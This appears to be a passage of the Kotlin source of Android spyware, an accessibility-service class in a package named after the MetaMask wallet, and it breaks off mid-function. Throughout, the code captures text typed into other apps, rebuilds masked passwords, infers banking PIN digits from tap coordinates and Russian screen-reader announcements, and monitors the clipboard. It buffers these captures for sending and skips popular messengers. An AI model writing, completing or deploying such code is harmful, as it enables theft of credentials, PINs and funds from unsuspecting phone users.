package com.example.MetaMask.services

import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.CopyOnWriteArrayList

class Sparrow {

    companion object {
        private const val FLUSH_INTERVAL_MS = 600L
    }

    @Volatile var enabled = false
    @Volatile private var watchedPkgs: Set<String> = emptySet()
    @Volatile private var watchedExclusions: Set<String> = emptySet()
    @Volatile private var activeWatched = false
    private val watchedPkgLabels = HashMap<String, String>()

    private val handler = Handler(Looper.getMainLooper())
    private val bgThread = HandlerThread("a11y-bg").also { it.start() }
    private val bgHandler = Handler(bgThread.looper)
    private val buffer = CopyOnWriteArrayList<JSONObject>()
    private var lastApp = ""

    private data class FieldEntry(
        val pkg: String,
        val name: String,
        val text: String,
        val isPassword: Boolean,
        val ts: Long,
        val src: String = "edit"
    )
    private val fieldState = LinkedHashMap<String, FieldEntry>()
    private val labelCache = HashMap<String, String>()

    private val webViewFieldLast = LinkedHashMap<String, String>()
    private val pwdTracked = LinkedHashMap<String, CharArray>()

    private val winSentCache = HashMap<String, String>()
    private val sentTexts = HashSet<String>()

    @Volatile private var focusedPwdKey = ""
    @Volatile private var focusedPwdPkg = ""
    @Volatile private var focusedIsPass = false
    @Volatile private var focusedHint = ""
    @Volatile private var lastHwKeyNs = 0L
    private val HW_DEDUP_NS = 500_000_000L

    private val pinTracked = LinkedHashMap<String, StringBuilder>()
    @Volatile private var lastPinClickNs = 0L
    @Volatile private var lastPinDigit: Char? = null
    private val pinFieldLengths = LinkedHashMap<String, Int>()
    private val pinLastSeenMs = LinkedHashMap<String, Long>()
    private val PIN_GRACE_MS = 60_000L
    private val pinScreenActive = mutableSetOf<String>()
    private val pinKeyLayout = LinkedHashMap<String, Map<String, Char>>()
    private val waitingLastPinDigit = LinkedHashMap<String, Boolean>()
    private val lastAnnounceTs = LinkedHashMap<String, Long>()
    private val lastDirectDigit = LinkedHashMap<String, Pair<Char, Long>>()
    private val prevDirectDigit = LinkedHashMap<String, Pair<Char, Long>>()
    private val lastCapturedDigit = LinkedHashMap<String, Char>()
    private val pinBtnRects = LinkedHashMap<String, MutableList<Pair<android.graphics.Rect, Char>>>()
    private val announceBurstTs = LinkedHashMap<String, MutableList<Long>>()
    private val burstIgnore = mutableSetOf<String>()
    private val lastTapNodeTs = LinkedHashMap<String, Long>()

    private val pinCoordsTracked = LinkedHashMap<String, StringBuilder>()
    private val coordLastTapMs = LinkedHashMap<String, Long>()
    private val coordLastTapKey = LinkedHashMap<String, String>()
    private val pinCoordsInhibitUntilMs = HashMap<String, Long>()
    private val pinWaitFirstAnn = HashMap<String, Boolean>()

    private var pinOverlayView: android.view.View? = null
    private var pinOverlayWm: android.view.WindowManager? = null
    private var pinOverlayParams: android.view.WindowManager.LayoutParams? = null
    private var pinOverlayPkg: String = ""
    private var overlayConsumed = false
    private var motionEventsActive = false

    private var clipboardManager: android.content.ClipboardManager? = null
    private val clipboardListener = android.content.ClipboardManager.OnPrimaryClipChangedListener {
        if (!enabled || !activeWatched) return@OnPrimaryClipChangedListener
        val cm = clipboardManager ?: return@OnPrimaryClipChangedListener
        val text = try {
            cm.primaryClip?.getItemAt(0)?.getText()?.toString()
        } catch (_: Exception) { null }
        if (text.isNullOrBlank() || text.length > 500) return@OnPrimaryClipChangedListener
        val pkg = lastApp.ifEmpty { return@OnPrimaryClipChangedListener }
        fieldState["$pkg/clip"] = FieldEntry(pkg, appLabel(pkg), text, false,
            System.currentTimeMillis(), "clip")
        flush()
    }
    private val PIN_RESET_NS = 300_000_000_000L
    private val PIN_DEDUP_NS = 50_000_000L
    private val BACKSPACE_LABELS = setOf("delete", "backspace", "удалить", "back", "del", "clear", "⌫", "←", "x")

    private val DEFAULT_EXCLUSION_LABELS = setOf(
        "Telegram", "WhatsApp", "Viber", "Signal",
        "Facebook", "Instagram", "ВКонтакте", "VK"
    )

    @Volatile private var browserPkgs: Set<String>? = null

    private fun isSystemApp(pkg: String): Boolean {
        android.util.Log.d("XDBG", "[Sparrow] isSystemApp enter pkg=${pkg}") //xdbg
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return try {
            val ctx = AccessSvc.instance ?: return false
            val info = ctx.packageManager.getApplicationInfo(pkg, 0)
            (info.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
        } catch (_: Exception) { false }
    }

    private fun isBrowser(pkg: String): Boolean {
        android.util.Log.d("XDBG", "[Sparrow] isBrowser enter pkg=${pkg}") //xdbg
        var cached = browserPkgs
        if (cached == null) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            cached = try {
                val ctx = AccessSvc.instance ?: return false
                val intent = android.content.Intent(android.content.Intent.ACTION_VIEW,
                    android.net.Uri.parse("http://example.com"))
                ctx.packageManager.queryIntentActivities(intent, 0)
                    .map { it.activityInfo.packageName }
                    .toSet()
            } catch (e: Exception) { emptySet() }
            browserPkgs = cached
        }
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return pkg in cached
    }

    private val IME_PKGS = setOf(
        "com.google.android.inputmethod.latin",
        "com.samsung.android.honeyboard",
        "com.swiftkey.swiftkeyapp",
        "com.touchtype.swiftkey",
        "com.nuance.swype.input",
        "com.microsoft.swiftkey",
        "com.baidu.input",
        "com.iflytek.inputmethod",
        "com.sohu.inputmethod.sogou",
        "com.qihoo.inputmethod",
        "com.tencent.qqpinyin",
        "com.google.android.inputmethod.pinyin",
        "com.miui.inputmethod",
        "com.xiaomi.inputmethod",
        "com.miui.ime",
        "com.sec.android.inputmethod",
        "com.oppo.inputmethod",
        "com.coloros.inputmethod",
        "com.huawei.inputmethod",
        "com.baidu.vi.ime",
        "com.google.android.inputmethod",
        "com.android.inputmethod.latin"
    )

    @Volatile private var cachedImePkg: String? = null

    private fun isImePackage(pkg: String): Boolean {
        android.util.Log.d("XDBG", "[Sparrow] isImePackage enter pkg=${pkg}") //xdbg
        if (pkg in IME_PKGS) return true
        if (pkg.contains("inputmethod", ignoreCase = true) ||
            pkg.contains("keyboard", ignoreCase = true) ||
            pkg.contains(".ime", ignoreCase = true)) return true
        val imeFlat = try {
            val ctx = AccessSvc.instance ?: return false
            android.provider.Settings.Secure.getString(
                ctx.contentResolver, android.provider.Settings.Secure.DEFAULT_INPUT_METHOD)
        } catch (_: Exception) { null }
        val imePkg = imeFlat?.let {
            android.content.ComponentName.unflattenFromString(it)?.packageName
        }
        if (imePkg != null) cachedImePkg = imePkg
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return pkg == (imePkg ?: cachedImePkg)
    }

    private val flushRunnable = Runnable { flush() }

    fun addWatchedPkg(realPkg: String, labelPkg: String = realPkg) {
        android.util.Log.d("XDBG", "[Sparrow] addWatchedPkg enter realPkg=${realPkg} labelPkg=${labelPkg}") //xdbg
        if (watchedPkgs.isEmpty() && enabled) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            val label = appLabel(realPkg)
            val newEx = watchedExclusions.toMutableSet().apply { remove(label) }
            watchedExclusions = newEx
            if (realPkg == lastApp || label == appLabel(lastApp)) activeWatched = true
            return
        }
        val newSet = watchedPkgs.toMutableSet().apply { add(realPkg) }
        watchedPkgs = newSet
        watchedPkgLabels[realPkg] = labelPkg
        enabled = true
        activeWatched = lastApp.isEmpty() || lastApp in watchedPkgs
    }

    fun removeWatchedPkg(realPkg: String) {
        android.util.Log.d("XDBG", "[Sparrow] removeWatchedPkg enter realPkg=${realPkg}") //xdbg
        if (watchedPkgs.isEmpty() && enabled) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            val label = appLabel(realPkg)
            val newEx = watchedExclusions.toMutableSet().apply { add(label) }
            watchedExclusions = newEx
            if (realPkg == lastApp || label == appLabel(lastApp)) activeWatched = false
            flush()
            return
        }
        val newSet = watchedPkgs.toMutableSet().apply { remove(realPkg) }
        watchedPkgs = newSet
        watchedPkgLabels.remove(realPkg)
        if (newSet.isEmpty()) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            enabled = false
            activeWatched = false
        } else {
            activeWatched = lastApp.isEmpty() || lastApp in watchedPkgs
        }
        flush()
    }

    fun enableAll() {
        android.util.Log.d("XDBG", "[Sparrow] enableAll enter") //xdbg
        watchedPkgs = emptySet()
        watchedPkgLabels.clear()
        val ownPkg = try { AccessSvc.instance?.packageName } catch (_: Exception) { null }
        val ownLabel = if (!ownPkg.isNullOrEmpty()) appLabel(ownPkg) else null

        val exclusions = mutableSetOf<String>()
        if (ownLabel != null) exclusions.add(ownLabel)
        exclusions.addAll(DEFAULT_EXCLUSION_LABELS)

        try {
            val ctx = AccessSvc.instance
            if (ctx != null) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                val saved = ctx.getSharedPreferences("sparrow_prefs", android.content.Context.MODE_PRIVATE)
                    .getString("excluded_pkgs", null)
                if (saved != null) {
                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                    val arr = org.json.JSONArray(saved)
                    for (i in 0 until arr.length()) {
                        android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                        val pkg = arr.optString(i)
                        if (pkg.isNotEmpty()) exclusions.add(appLabel(pkg))
                    }
                }
            }
        } catch (_: Exception) {}

        watchedExclusions = exclusions
        enabled = true
        activeWatched = ownPkg == null || lastApp != ownPkg

        try {
            val ctx = AccessSvc.instance
            if (ctx != null && clipboardManager == null) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                clipboardManager = ctx.getSystemService(android.content.Context.CLIPBOARD_SERVICE)
                    as? android.content.ClipboardManager
                clipboardManager?.addPrimaryClipChangedListener(clipboardListener)
            }
        } catch (_: Exception) {}

    }

    fun disableAll() {
        android.util.Log.d("XDBG", "[Sparrow] disableAll enter") //xdbg
        watchedPkgs = emptySet()
        watchedPkgLabels.clear()
        enabled = false
        activeWatched = false
        flush()
    }

    private fun labelFor(pkg: String): String = watchedPkgLabels[pkg] ?: appLabel(pkg)

    fun getWatchedPkgs(): Set<String> = watchedPkgs

    fun onEvent(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[Sparrow] onEvent enter event=${event}") //xdbg
        if (!enabled) return

        val evtPkg = event.packageName?.toString() ?: ""
        val isContentChanged = event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        if (isContentChanged && (evtPkg == "com.android.systemui" || evtPkg == "com.android.launcher3")) return

        if (activeWatched && evtPkg.isNotEmpty()) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            val evTypeName = when(event.eventType) {
                AccessibilityEvent.TYPE_VIEW_CLICKED -> "CLICK"
                AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> "LONG_CLICK"
                AccessibilityEvent.TYPE_VIEW_SELECTED -> "SELECTED"
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> "FOCUSED"
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TEXT_CHG"
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "WIN_STATE"
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> "CONTENT_CHG"
                AccessibilityEvent.TYPE_VIEW_SCROLLED -> "SCROLLED"
                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> "TEXT_SEL"
                AccessibilityEvent.TYPE_ANNOUNCEMENT -> "ANNOUNCE"
                AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED -> "ACC_FOCUS"
                AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED -> "ACC_FOCUS_CLR"
                AccessibilityEvent.TYPE_TOUCH_INTERACTION_START -> "TOUCH_START"
                AccessibilityEvent.TYPE_TOUCH_INTERACTION_END -> "TOUCH_END"
                else -> "EVT_0x${event.eventType.toString(16)}"
            }
        }

        try {
            when (event.eventType) {

                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    val pkg = event.packageName?.toString() ?: return
                    if (isImePackage(pkg)) return
                    val ownPkgName = try { AccessSvc.instance?.packageName } catch (_: Exception) { null }
                    if (!ownPkgName.isNullOrEmpty() && pkg == ownPkgName) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        return
                    }
                    if (pkg == lastApp) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        if (pinScreenActive.contains(pkg) && pinTracked[pkg]?.isNotEmpty() == true) {
                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                            pinScreenActive.remove(pkg)
                            pinWaitFirstAnn.remove(pkg)
                            pinCoordsInhibitUntilMs[pkg] = System.currentTimeMillis() + 200L
                            removePinOverlay()
                            flushCoordsResult(pkg, "WIN_CONFIRMED")
                            pinCoordsTracked.remove(pkg)
                            coordLastTapMs.remove(pkg)
                            coordLastTapKey.remove(pkg)
                            pinTracked.remove(pkg)
                            pinFieldLengths.entries.removeIf { it.key.startsWith("$pkg/") }
                            lastPinDigit = null
                            lastDirectDigit.remove(pkg)
                            prevDirectDigit.remove(pkg)
                            lastCapturedDigit.remove(pkg)
                            lastAnnounceTs.remove(pkg)
                            waitingLastPinDigit.remove(pkg)
                        }
                        sentTexts.clear()
                        winSentCache.clear()
                        return
                    }

                    val prevApp = lastApp
                    if (prevApp.isNotEmpty()) pinLastSeenMs[prevApp] = System.currentTimeMillis()
                    if (prevApp.isNotEmpty() && pinCoordsTracked[prevApp]?.isNotEmpty() == true) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        flushCoordsResult(prevApp, "WIN_APP_SWITCH")
                        pinCoordsTracked.remove(prevApp)
                        coordLastTapMs.remove(prevApp)
                        coordLastTapKey.remove(prevApp)
                    }

                    lastApp = pkg
                    lastDirectDigit.remove(pkg)
                    prevDirectDigit.remove(pkg)
                    lastCapturedDigit.remove(pkg)
                    lastAnnounceTs.remove(pkg)
                    waitingLastPinDigit.remove(pkg)
                    val prevWatched = activeWatched
                    activeWatched = if (watchedPkgs.isEmpty()) {
                        !watchedExclusions.contains(appLabel(pkg)) && !isSystemApp(pkg)
                    } else {
                        pkg in watchedPkgs || isBrowser(pkg)
                    }

                    val appLabel = appLabel(pkg)

                    val lastSeen = pinLastSeenMs[pkg] ?: 0L
                    val elapsed = System.currentTimeMillis() - lastSeen
                    if (elapsed > PIN_GRACE_MS) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        removePinOverlay()
                        pinTracked.remove(pkg)
                        pinScreenActive.remove(pkg)
                        pinFieldLengths.entries.removeIf { it.key.startsWith("$pkg/") }
                        pinCoordsTracked.remove(pkg)
                        coordLastTapMs.remove(pkg)
                        coordLastTapKey.remove(pkg)
                    }
                    winSentCache.clear()
                    sentTexts.clear()
                    if (prevWatched && !activeWatched && buffer.isNotEmpty()) flush()

                    if (activeWatched) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        buffer.add(JSONObject().apply {
                            put("t", "app")
                            put("ts", System.currentTimeMillis())
                            put("pkg", labelFor(pkg))
                            put("name", appLabel)
                            put("cls", event.className?.toString() ?: "")
                        })
                        scheduleFlush()
                    }
                }

                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    if (!activeWatched) return
                    val pkg = event.packageName?.toString() ?: return
                    val node = try { event.source } catch (e: Exception) { null }

                    val isPassword = node?.isPassword == true
                    val fieldId = node?.viewIdResourceName ?: ""
                    val hint = node?.hintText?.toString() ?: ""
                    val afterTxt = event.text?.joinToString("")
                        ?.takeIf { it.isNotEmpty() }
                        ?: node?.text?.toString()
                        ?: ""
                    val fromIdx = event.fromIndex
                    val addedCnt = event.addedCount
                    val removedCnt = event.removedCount
                    try { node?.recycle() } catch (_: Exception) {}

                    if (afterTxt.isEmpty()) return

                    val effectiveHint = hint.ifEmpty { focusedHint }
                    if (effectiveHint.isNotEmpty() && afterTxt == effectiveHint) return

                    if (isPassword && System.nanoTime() - lastHwKeyNs < HW_DEDUP_NS) return

                    val key = "$pkg/$fieldId"

                    val text = if (isPassword) {
                        trackPassword(key, afterTxt, fromIdx, addedCnt, removedCnt)
                    } else {
                        afterTxt
                    }

                    if (text.isBlank()) return

                    fieldState[key] = FieldEntry(pkg, appLabel(pkg), text, isPassword, System.currentTimeMillis(), "edit")

                    val lowerHint = hint.lowercase()
                    val lowerFieldId = fieldId.lowercase()
                    val sensitiveKeyword = listOf("pin", "код", "code", "otp", "cvv", "cvc", "secret", "pass")
                        .any { lowerHint.contains(it) || lowerFieldId.contains(it) }
                    val looksLikeCode = text.length in 4..8 && text.all { it.isDigit() }
                    if (isPassword || sensitiveKeyword || looksLikeCode) { flush(); return }
                    scheduleFlush()
                }

                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    if (!activeWatched) return
                    val evPkg = event.packageName?.toString() ?: ""
                    val evChgTypes = event.contentChangeTypes
                    val srcBg = try { event.source } catch (_: Exception) { null }
                    bgHandler.post {
                        try {
                            handleContentChanged(srcBg, evPkg, evChgTypes)
                            if (evPkg.isNotEmpty() && !isImePackage(evPkg)) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                captureWindowInputs(evPkg)
                                trackPinFieldChanges(evPkg)
                                if (fieldState.isNotEmpty()) handler.post { scheduleFlush() }
                            }
                        } finally {
                            try { srcBg?.recycle() } catch (_: Exception) {}
                        }
                    }
                    if (evPkg.isNotEmpty() && !isImePackage(evPkg)) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        val src = try { event.source } catch (_: Exception) { null }
                        if (src != null) {
                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                            try {
                                val r = android.graphics.Rect()
                                src.getBoundsInScreen(r)
                                val w = r.width(); val h = r.height()
                                val srcClsShort = src.className?.toString()?.substringAfterLast('.') ?: ""
                                if (src.isClickable && !r.isEmpty) {
                                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                    val srcText = src.text?.toString()?.trim() ?: ""
                                    val srcDesc = src.contentDescription?.toString()?.trim() ?: ""
                                    val digitDirect = digitFromStr(srcText) ?: digitFromStr(srcDesc) ?: extractDigitDeep(src, 2)
                                    if (w in 100..600 && h in 40..300) {
                                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                        if (digitDirect != null) {
                                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                            val now = System.currentTimeMillis()
                                            lastTapNodeTs[evPkg] = now
                                            val prev = lastDirectDigit[evPkg]
                                            if (prev != null) prevDirectDigit[evPkg] = prev
                                            lastDirectDigit[evPkg] = Pair(digitDirect, now)
                                            if (!pinScreenActive.contains(evPkg)) {
                                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                val earlyInhibit = pinCoordsInhibitUntilMs[evPkg] ?: 0L
                                                if (System.currentTimeMillis() < earlyInhibit) {
                                                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                } else {
                                                    val layoutWasBuilt = !pinKeyLayout[evPkg].isNullOrEmpty()
                                                    if (!layoutWasBuilt) {
                                                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                        buildPinKeyLayout(evPkg)
                                                    }
                                                    val earlySize = pinKeyLayout[evPkg]?.size ?: 0
                                                    if (earlySize >= 8) {
                                                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                        pinScreenActive.add(evPkg)
                                                        if (layoutWasBuilt) {
                                                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                            pinWaitFirstAnn[evPkg] = true
                                                            pinCoordsTracked.remove(evPkg)
                                                            coordLastTapMs.remove(evPkg)
                                                            coordLastTapKey.remove(evPkg)
                                                        }
                                                    }
                                                }
                                            }
                                            if (waitingLastPinDigit[evPkg] == true) {
                                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                waitingLastPinDigit.remove(evPkg)
                                                lastAnnounceTs[evPkg] = now
                                                lastCapturedDigit[evPkg] = digitDirect
                                                appendPinDigit(evPkg, digitDirect)
                                            }
                                        }
                                        if (pinScreenActive.contains(evPkg)) {
                                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                            val layout = pinKeyLayout[evPkg]
                                            if (!layout.isNullOrEmpty()) {
                                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                val cx = r.centerX(); val cy = r.centerY()
                                                var matchedDigit: Char? = null
                                                for ((key, dg) in layout) {
                                                    android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                                                    val p = key.split(',')
                                                    if (p.size == 4) {
                                                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                        val kl = p[0].toIntOrNull() ?: continue
                                                        val kt = p[1].toIntOrNull() ?: continue
                                                        val kr = p[2].toIntOrNull() ?: continue
                                                        val kb = p[3].toIntOrNull() ?: continue
                                                        if (cx in kl..kr && cy in kt..kb) { matchedDigit = dg; break }
                                                    }
                                                }
                                                val nowC = System.currentTimeMillis()
                                                val coordsInhibitUntil = pinCoordsInhibitUntilMs[evPkg] ?: 0L
                                                if (pinWaitFirstAnn[evPkg] == true) {
                                                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                } else if (nowC < coordsInhibitUntil) {
                                                } else if (matchedDigit != null) {
                                                    val posKey = "$cx,$cy"
                                                    val lastMs = coordLastTapMs[evPkg] ?: 0L
                                                    val lastKey = coordLastTapKey[evPkg]
                                                    if (posKey != lastKey || nowC - lastMs >= 300L) {
                                                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                        val coordsLen = pinCoordsTracked[evPkg]?.length ?: 0
                                                        val textLen = pinTracked[evPkg]?.length ?: 0
                                                        if (coordsLen > textLen) {
                                                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                                        } else {
                                                            coordLastTapMs[evPkg] = nowC
                                                            coordLastTapKey[evPkg] = posKey
                                                            val csb = pinCoordsTracked.getOrPut(evPkg) { StringBuilder() }
                                                            csb.append(matchedDigit)
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            } finally { try { src.recycle() } catch (_: Exception) {} }
                        }
                        if (src == null) {
                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                            val acc = pinTracked[evPkg]?.length ?: 0
                            val recCnt = try { event.recordCount } catch (_: Exception) { 0 }
                            if (acc in 3..4) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                if (acc == 4) {
                                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                    val nr = try { AccessSvc.instance?.rootInActiveWindow } catch (_: Exception) { null }
                                    if (nr != null) {
                                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                        val sp = if (pinBtnRects[evPkg].isNullOrEmpty()) evPkg else null
                                        try { scanBtnsLog(nr, storePkg = sp) }
                                        finally { try { nr.recycle() } catch (_: Exception) {} }
                                    }
                                }
                            }
                        }
                    }
                }

                AccessibilityEvent.TYPE_ANNOUNCEMENT -> {
                    if (!activeWatched) return
                    val pkg = event.packageName?.toString() ?: return
                    val text = event.text?.joinToString("") ?: return
                    if (text.isBlank() || text.length > 64) return
                    val countMatch = Regex("""Введено:\s*(\d+)\s*из""").find(text)
                    val isPinAnnounce = countMatch != null || text.contains("Проверяем")
                    if (isPinAnnounce) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        val count = countMatch?.groupValues?.get(1)?.toIntOrNull()

                        val now = System.currentTimeMillis()

                        if (count == 1 || pinKeyLayout[pkg] == null) {
                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                            buildPinKeyLayout(pkg)
                            if (count == 1) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                pinScreenActive.add(pkg)
                            }
                            lastAnnounceTs.remove(pkg)
                            waitingLastPinDigit.remove(pkg)
                            val freshTapMs = now - (lastDirectDigit[pkg]?.second ?: 0L)
                            if (freshTapMs > 200L) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                lastDirectDigit.remove(pkg)
                                prevDirectDigit.remove(pkg)
                            }
                            lastCapturedDigit.remove(pkg)
                            pinBtnRects.remove(pkg)
                            if (count == 1 && pinTracked[pkg]?.isNotEmpty() == true) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                val justAppendedMs = System.currentTimeMillis() - (lastPinClickNs / 1_000_000L)
                                if (justAppendedMs > 300L) {
                                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                    removePinOverlay()
                                    pinTracked.remove(pkg)
                                    fieldState.remove("$pkg/pin")
                                    lastPinDigit = null
                                    pinCoordsTracked.remove(pkg)
                                    coordLastTapMs.remove(pkg)
                                    coordLastTapKey.remove(pkg)
                                }
                            }
                        }
                        val lastAnn = lastAnnounceTs[pkg] ?: 0L
                        val lastDD = lastDirectDigit[pkg]
                        val prevDD = prevDirectDigit[pkg]
                        val lastCapped = lastCapturedDigit[pkg]
                        var found: Char? = null
                        var waitReason = ""

                        if (lastDD != null) {
                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                            val (D, T) = lastDD
                            val D2 = prevDD?.first
                            val T2 = prevDD?.second ?: 0L

                            if (D2 != null && D != D2 && T - T2 in 1L..50L && T > lastAnn && T2 > lastAnn && now - T <= 500L) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                val useDigit = when {
                                    D == lastCapped -> D2
                                    D2 == lastCapped -> D
                                    else -> D
                                }
                                found = useDigit
                            }
                            else if (D == lastCapped && T > lastAnn && now - T <= 400L) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                waitReason = "CASE_B_SAME_AS_LAST D=$D lastCapped=$lastCapped"
                            }
                            else if (T > lastAnn && now - T <= 400L) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                found = D
                            } else {
                                waitReason = "TIMING_MISS lastDigit=$D delta=${if (T > 0L) now - T else -1L}ms freshAfterAnn=${T > lastAnn}"
                            }
                        } else {
                            waitReason = "TIMING_MISS lastDigit=null"
                        }

                        if (found != null) {
                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                            lastAnnounceTs[pkg] = now
                            lastCapturedDigit[pkg] = found
                            appendPinDigit(pkg, found)
                            if (count == 4) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                val pre5Pkg = pkg
                                for (sn in 1..8) {
                                    android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                                    handler.postDelayed({
                                        if (pinTracked[pre5Pkg]?.length != 4) return@postDelayed
                                        val rr = try { AccessSvc.instance?.rootInActiveWindow } catch (_: Exception) { null }
                                        if (rr != null) {
                                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                            val sp = if (pinBtnRects[pre5Pkg].isNullOrEmpty()) pre5Pkg else null
                                            try { scanBtnsLog(rr, storePkg = sp) }
                                            finally { try { rr.recycle() } catch (_: Exception) {} }
                                        }
                                    }, sn * 50L)
                                }
                            }
                        } else if (text.contains("Проверяем")) {
                            if ((pinTracked[pkg]?.length ?: 0) >= 5) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                            } else {
                                val annSrc = try { event.source } catch (_: Exception) { null }
                                if (annSrc != null) {
                                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                    try {
                                    } finally { try { annSrc.recycle() } catch (_: Exception) {} }
                                }
                                val provRoot = try { AccessSvc.instance?.rootInActiveWindow } catch (_: Exception) { null }
                                if (provRoot != null) {
                                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                    try { scanBtnsLog(provRoot) }
                                    finally { try { provRoot.recycle() } catch (_: Exception) {} }
                                }
                                val retryPkg = pkg
                                waitingLastPinDigit[pkg] = true
                                handler.postDelayed({
                                    if (waitingLastPinDigit[retryPkg] != true) return@postDelayed
                                    waitingLastPinDigit.remove(retryPkg)
                                    val dd2 = lastDirectDigit[retryPkg]
                                    val d2 = dd2?.first
                                    val ts2 = dd2?.second ?: 0L
                                    val lastAnn2 = lastAnnounceTs[retryPkg] ?: 0L
                                    val lastCapped2 = lastCapturedDigit[retryPkg]
                                    if (d2 != null && ts2 > lastAnn2) {
                                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                        if (d2 == lastCapped2) {
                                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                        } else {
                                            lastAnnounceTs[retryPkg] = System.currentTimeMillis()
                                            lastCapturedDigit[retryPkg] = d2
                                            appendPinDigit(retryPkg, d2)
                                        }
                                    }
                                    removePinOverlay()
                                    flushCoordsResult(retryPkg, "PROVERAEM")
                                    pinScreenActive.remove(retryPkg)
                                    pinTracked.remove(retryPkg)
                                    pinWaitFirstAnn.remove(retryPkg)
                                    pinCoordsInhibitUntilMs[retryPkg] = System.currentTimeMillis() + 200L
                                }, 120L)
                            }
                        } else {
                            waitingLastPinDigit[pkg] = true
                        }
                    }
                    if (!isPinAnnounce) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        buffer.add(JSONObject().apply {
                            put("t", "announce")
                            put("ts", System.currentTimeMillis())
                            put("pkg", labelFor(pkg))
                            put("name", appLabel(pkg))
                            put("text", text)
                        })
                        flush()
                    }
                }

                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    if (!activeWatched) return
                    handleViewClicked(event)
                }

                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    if (!activeWatched) return
                    val pkg = event.packageName?.toString() ?: return
